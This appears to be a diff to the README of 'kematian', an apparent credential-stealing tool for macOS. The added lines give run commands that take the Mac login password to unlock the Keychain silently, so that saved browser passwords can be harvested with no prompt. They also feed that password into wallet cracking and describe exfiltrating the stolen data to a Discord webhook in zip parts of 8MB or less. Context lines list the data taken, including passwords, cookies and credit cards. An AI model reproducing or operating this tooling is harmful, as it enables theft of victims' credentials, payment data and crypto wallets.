@@ -53,6 +53,22 @@ Or:
 
 `-quiet` reduces console output.
 
+### macOS login password (silent Keychain unlock)
+
+Chrome/Brave/Edge saved passwords need the **login Keychain** unlocked. Without your Mac password, `security` may fail (`exit status 128`) or show a GUI prompt.
+
+```bash
+./kematian-darwin-arm64 -mac-password 'YourMacLoginPassword'
+# or
+KEMATIAN_MAC_PASSWORD='YourMacLoginPassword' ./kematian-darwin-arm64
+```
+
+This runs `security unlock-keychain` before harvest — **no password modal**. The Mac login password is also added to `password_candidates.json` for wallet cracking.
+
+### Discord upload size
+
+Webhook uploads are split into **≤8MB** zip parts. Discord returns `HTTP 413 Request entity too large` if a single POST exceeds their limit (~8–25MB depending on payload). Multi-part uploads look like `hostname-kematian-arm64-part1.zip`, `part2.zip`, etc.
+
 ## What it collects
 
 - Passwords, cookies, history, bookmarks, autofill, credit cards  
